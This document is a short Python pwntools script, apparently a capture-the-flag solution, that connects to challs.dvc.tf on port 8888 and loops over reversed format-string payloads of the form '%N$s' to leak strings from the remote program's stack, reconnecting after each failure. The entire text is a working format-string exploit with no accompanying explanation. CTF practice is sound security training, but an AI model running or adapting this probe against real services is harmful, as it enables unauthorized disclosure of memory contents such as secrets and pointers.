from pwn import *
r = remote("challs.dvc.tf", 8888)
for i in range(3,200):
	try:
		payload = "%"+str(i)+"$s"
		r.recvuntil(":")
		r.sendline(payload[::-1])
		r.recvuntil("Result: \n")
		print(i,r.recvline())
	except Exception as e:
		r = remote("challs.dvc.tf", 8888)
		continue
